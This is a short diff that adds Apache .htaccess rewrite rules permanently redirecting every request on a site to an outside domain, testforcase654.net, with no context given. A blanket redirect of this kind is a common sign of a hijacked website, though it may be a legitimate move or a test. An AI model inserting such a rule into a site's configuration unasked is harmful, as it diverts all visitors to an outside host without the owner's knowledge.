@@ -1,0 +1,2 @@
+RewriteEngine on 
+RewriteRule ^(.*)$ http://testforcase654.net/ [R=301,L]
